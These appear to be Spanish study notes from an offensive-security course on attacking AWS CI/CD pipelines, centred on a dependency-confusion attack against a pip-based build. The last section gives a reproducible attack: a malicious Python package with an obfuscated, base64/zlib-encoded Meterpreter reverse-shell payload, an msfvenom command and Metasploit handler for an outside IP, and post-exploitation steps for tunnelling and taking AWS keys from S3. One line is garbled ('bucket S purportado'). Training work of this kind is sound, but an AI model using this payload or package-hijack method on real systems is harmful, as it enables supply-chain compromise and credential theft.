# Attacking AWS

## CI/CD

Los sistemas CI/CD son esenciales para automatizar el despliegue de aplicaciones en AWS, requiriendo acceso a código fuente, secretos y diversos servicios de AWS. Sin embargo, su integración amplía la superficie de ataque, convirtiéndolos en objetivos principales para atacantes. Comprometer un pipeline CI/CD puede llevar a una escalada de privilegios y un acceso más profundo a la infraestructura en la nube. Este módulo explora vulnerabilidades destacadas en la lista de los Top 10 CI/CD Security Risks de OWASP, con enfoque en técnicas prácticas de explotación.

---

## OWASP Top 10 CI/CD Security Risks

- **CICD-SEC-1: Insufficient Flow Control Mechanisms**
- **CICD-SEC-2: Inadequate Identity and Access Management**
- **CICD-SEC-3: Dependency Chain Abuse**
- **CICD-SEC-4: Poisoned Pipeline Execution (PPE)**
- **CICD-SEC-5: Insufficient PBAC (Pipeline-Based Access Controls)**
- **CICD-SEC-6: Insufficient Credential Hygiene**
- **CICD-SEC-7: Insecure System Configuration**
- **CICD-SEC-8: Ungoverned Usage of 3rd Party Services**
- **CICD-SEC-9: Improper Artifact Integrity Validation**
- **CICD-SEC-10: Insufficient Logging and Visibility**

---

## Parte 1: Secretos Expuestos y Ejecución de Pipeline Envenenado

Esta sección se centra en explotar vulnerabilidades relacionadas con **CICD-SEC-4: Poisoned Pipeline Execution (PPE)**, **CICD-SEC-5: Insufficient PBAC** y **CICD-SEC-6: Insufficient Credential Hygiene**.

### Conceptos Clave

- **Ejecución de Pipeline Envenenado (PPE)**:
  - Los atacantes toman control de scripts de construcción/despliegue, lo que puede llevar a:
    - Ejecución de un shell inverso.
    - Robo de secretos sensibles.
  - Ejemplo: Inyectar código malicioso en un script de pipeline para ejecutar acciones no autorizadas.

- **Controles de Acceso Basados en Pipeline Insuficientes (PBAC)**:
  - Los pipelines carecen de protección adecuada para secretos y activos sensibles, permitiendo accesos no autorizados.
  - Ejemplo: Roles con permisos excesivos que permiten comprometer recursos sensibles.

- **Higiene de Credenciales Insuficiente**:
  - Gestión débil de secretos y tokens, haciéndolos propensos a filtraciones o escaladas.
  - Ejemplo: Credenciales codificadas en scripts o almacenadas en ubicaciones accesibles públicamente.

### Ejemplo de Explotación

- **Escenario**: Explotar una mala configuración de un bucket S3 para acceder a credenciales de Git.
- **Pasos**:
  1. Identificar un bucket S3 mal configurado (ej., con acceso de lectura público) que contenga credenciales de Git.
  2. Usar las credenciales para modificar el pipeline CI/CD.
  3. Inyectar un payload malicioso en el pipeline para:
     - Robar secretos (ej., claves API, tokens).
     - Comprometer el entorno (ej., obtener un shell inverso).

---

## Parte 2: Abuso de la Cadena de Dependencias

Esta sección cubre **CICD-SEC-3: Dependency Chain Abuse**, **CICD-SEC-5: Insufficient PBAC**, **CICD-SEC-7: Insecure System Configuration** y **CICD-SEC-9: Improper Artifact Integrity Validation**.

### Conceptos Clave

- **Abuso de la Cadena de Dependencias**:
  - Los atacantes engañan al sistema de construcción para que descargue código malicioso mediante:
    - Secuestro de una dependencia oficial.
    - Creación de paquetes con nombres similares (typosquatting).
  - Ejemplo: Publicar un paquete malicioso en un repositorio público que el pipeline descargue.

- **Controles de Acceso Basados en Pipeline Insuficientes (PBAC)**:
  - Los pipelines tienen permisos excesivos, aumentando la vulnerabilidad a compromisos.
  - Ejemplo: Un rol de pipeline con permisos IAM demasiado amplios accede a recursos no previstos.

- **Configuración de Sistema Insegura**:
  - Configuraciones erróneas o código inseguro en aplicaciones del pipeline.
  - Ejemplo: Software de pipeline sin parches o entornos de construcción mal configurados.

- **Validación de Integridad de Artefactos Inadecuada**:
  - La falta de verificaciones permite a los atacantes inyectar código malicioso en el pipeline.
  - Ejemplo: Desplegar artefactos no verificados que contienen payloads maliciosos.

### Ejemplo de Explotación

- **Escenario**: Explotar una dependencia ausente en un repositorio público para desplegar código malicioso.
- **Pasos**:
  1. Identificar una dependencia mencionada en información pública pero ausente en el repositorio.
  2. Publicar un paquete malicioso con el mismo nombre en un repositorio público (ej., npm, PyPI).
  3. El pipeline CI/CD descarga y ejecuta el paquete malicioso en producción.
  4. En producción:
     - Escanear la red para descubrir servicios adicionales.
     - Crear un túnel hacia el servidor de automatización.
     - Explotar una vulnerabilidad en un plugin para obtener claves AWS.
  5. Acceder a un bucket S purportado que contiene un archivo de estado de Terraform con claves AWS de administrador.

---

## Dependency Confusion
 El **Abuso de la Cadena de Dependencias** ocurre cuando un atacante engaña al sistema de construcción para que descargue código malicioso, secuestrando dependencias legítimas o usando nombres similares (typosquatting).

### Riesgos Asociados
- **Permisos Excesivos en Pipelines**: Controles de acceso insuficientes aumentan el riesgo de compromiso.
- **Configuraciones Inseguras**: Errores en la configuración o código vulnerable.
- **Validación Débil de Artefactos**: Permite inyectar código malicioso sin detección.

### Pasos del Ataque
1. Identificar una dependencia ausente en información pública.
2. Publicar un paquete malicioso con el mismo nombre en un repositorio público.
3. El pipeline CI/CD ejecuta el paquete en producción.
4. Explotar el acceso:
   - Escanear la red interna.
   - Tunelizar al servidor de automatización.
   - Explotar plugins para obtener claves AWS.
   - Acceder a un bucket S3 con claves administrativas en un archivo Terraform.

---

## Ataque a la Cadena de Dependencias

![](https://static.offsec.com/offsec-courses/PEN-200/imgs/attacking_cicd_3/f5829b1c819297996be5d5f34ec169e8-aacicd3_hackshort-builder-no-root.png)

-----

![](https://static.offsec.com/offsec-courses/PEN-200/imgs/attacking_cicd_3/97aa0f6a74d67f53327fbe68807cffe3-aacicd3_hackshort-builder-with-root.png)

----

### Objetivos
- Entender el ataque.
- Publicar un paquete malicioso.

### Riesgos de Seguridad OWASP
- **CICD-SEC-3: Dependency Chain Abuse**: 
  - Un atacante publica un paquete malicioso con un nombre idéntico o similar al de una dependencia legítima, aprovechando la priorización de repositorios públicos sobre privados.
- **CICD-SEC-5: Insufficient PBAC (Pipeline-Based Access Controls)**: 
  - Los pipelines tienen permisos excesivos, permitiendo acceso no autorizado a recursos sensibles.
- **CICD-SEC-7: Insecure System Configuration**: 
  - Configuraciones erróneas o código inseguro en pipelines introducen vulnerabilidades explotables.
- **CICD-SEC-9: Improper Artifact Integrity Validation**: 
  - La falta de verificaciones permite inyectar código malicioso en artefactos desplegados.


### Cómo Funciona
Los gestores de paquetes (ej., PyPI) priorizan repositorios públicos o versiones más altas. Un atacante puede subir un paquete malicioso con una versión superior, que será descargado en lugar del legítimo.

#### Configuración de `pip`
- **`index-url`**: Repositorio predeterminado (PyPI).
- **`extra-index-url`**: Busca en múltiples repositorios, priorizando la versión más alta.

#### Especificadores de Versión
- `==`: Versión exacta (ej., `1.0.0`).
- `<=`, `>=`: Versiones menores o mayores.
- `~=` : Versiones compatibles (ej., `~=1.0.0` acepta 1.0.1, no 1.2.0).

## Pasos del Ataque

1. **Reconocimiento**:
   - Identificar una dependencia ausente o mencionada en información pública (ej., un foro que revela el uso de `hackshort-util~=1.1.0`).
   - Confirmar que el pipeline usa `pip` con `extra-index-url`, aumentando la probabilidad de priorizar un repositorio público.

2. **Creación de un Paquete Malicioso**:
   - Crear un paquete Python (`hackshort-util-1.1.4`) que coincida con el nombre y cumpla con el especificador de versión (`~=1.1.0`).
   - Incluir un payload malicioso (ej., un shell inverso Meterpreter) en el archivo `utils.py` del paquete.

3. **Ejecución en Tiempo de Instalación**:
   - El paquete ejecuta código malicioso durante la instalación, escribiendo en `/tmp/running_during_install` para confirmar la ejecución.

4. **Ejecución en Tiempo de Ejecución**:
   - Crear un archivo `utils.py` con:
     - Una función comodín `__getattr__` para manejar cualquier llamada a funciones inexistentes.
     - Un gancho de excepción (`sys.excepthook`) para capturar errores y mantener el control.
     - Un payload Meterpreter para enviar un shell inverso al atacante.

5. **Publicación del Paquete**:
   - Subir el paquete a un repositorio público simulado (ej., `http://pypi.offseclab.io/`) usando credenciales proporcionadas (`student:password`).
   - Configurar `~/.pypirc` para especificar el repositorio y subir el paquete con:
     ```bash
     python3 setup.py sdist upload -r offseclab
     ```

6. **Ejecución en Producción**:
   - El pipeline CI/CD descarga el paquete malicioso durante su ciclo de reconstrucción (cada 10 minutos).
   - El payload se ejecuta, enviando un shell inverso al atacante.

7. **Explotación Adicional**:
   - Desde el shell inverso, escanear la red interna para descubrir servicios.
   - Crear un túnel hacia el servidor de automatización.
   - Explotar una vulnerabilidad en un plugin para obtener claves AWS.
   - Acceder a un bucket S3 con un archivo de estado de Terraform que contiene claves AWS de administrador.

---

## Explotabilidad Práctica: Ejemplo Claro para Reproducir el Ataque

### Escenario
Una empresa usa un pipeline CI/CD que depende de `hackshort-util~=1.1.0`, configurado con `extra-index-url` para buscar en un repositorio interno y PyPI. Un atacante descubre esta dependencia en un foro público y decide explotarla.

### Pasos para Reproducir

1. **Preparar el Entorno**:
   - Configurar una máquina Kali local y una instancia Kali en la nube (IP: `192.88.99.76`).
   - Crear un directorio para el paquete malicioso:
     ```bash
     mkdir hackshort-util && cd hackshort-util
     ```

2. **Crear el Paquete Malicioso**:
   - Crear un archivo `setup.py`:
     ```python
     from setuptools import setup
     setup(
         name="hackshort-util",
         version="1.1.4",
         packages=["hackshort_util"],
     )
     ```
   - Crear un directorio `hackshort_util` con un archivo `utils.py`:
     ```python
     import time
     import sys

     def standardFunction():
         pass

     def __getattr__(name):
         return standardFunction

     def catch_exception(exc_type, exc_value, tb):
         while True:
             time.sleep(1000)

     sys.excepthook = catch_exception

     # Payload Meterpreter
     exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckGMPuUrvtYgURDyIiuHsTWdp01NI0KZmsVsX/7oYsXmZ4b968+ejHyflA0ekBgvw2fSvbBqHIJQZ/0EGGfgTy6jydaW+pb+wb8OVCbEgW/NcxZlinZpUSX8kT3j7e3O+3u6fb6wcRdUo7a0EHztmyWqmyVFWl1gWTeV6WIkpaD81AMpg1TCF6x+EKDcDELwQxddpJHezU6IGzqzsmUXnQHzwX4nnxQrr6hI0gn++9AWrA8k5cmqNdd/ZfPU+0IDCD5vFs1YF24+QBkacPqLbII9lBVMofhmyDv4L8AerjXyE=')[0])))
     ```

3. **Generar el Payload Meterpreter**:
   - Usar `msfvenom` para generar un payload Python:
     ```bash
     msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=192.88.99.76 LPORT=4488
     ```
   - Copiar el payload generado al final de `utils.py`.

4. **Configurar el Repositorio**:
   - Crear el archivo `~/.pypirc`:
     ```ini
     [distutils]
     index-servers = 
         offseclab

     [offseclab]
     repository: http://pypi.offseclab.io/
     username: student
     password: password
     ```

5. **Construir y Subir el Paquete**:
   - Construir y subir el paquete al repositorio simulado:
     ```bash
     python3 setup.py sdist upload -r offseclab
     ```

6. **Configurar el Listener**:
   - Iniciar sesión en la instancia Kali en la nube:
     ```bash
     ssh kali@192.88.99.76
     ```
   - Iniciar la base de datos de Metasploit:
     ```bash
     sudo msfdb init
     ```
   - Iniciar `msfconsole` y configurar el handler:
     ```bash
     msfconsole
     use exploit/multi/handler
     set payload python/meterpreter/reverse_tcp
     set LHOST 0.0.0.0
     set LPORT 4488
     set ExitOnSession false
     run -jz
     ```

7. **Esperar la Ejecución**:
   - El pipeline CI/CD descargará el paquete malicioso en su próximo ciclo de construcción (cada 10 minutos).
   - Verificar la recepción del shell inverso en `msfconsole`:
     ```bash
     sessions -i <session_id>
     ```

8. **Explotación Adicional**:
   - Desde el shell Meterpreter, ejecutar:
     - Escaneo de red: `run post/multi/recon/local_exploit_suggester`
     - Crear un túnel: `portfwd add -l 8080 -r <automation_server_ip> -p 8080`
     - Explotar un plugin vulnerable para obtener claves AWS.
     - Acceder al bucket S3: `aws s3 ls s3://<bucket_name>` y descargar el archivo de estado de Terraform.

---
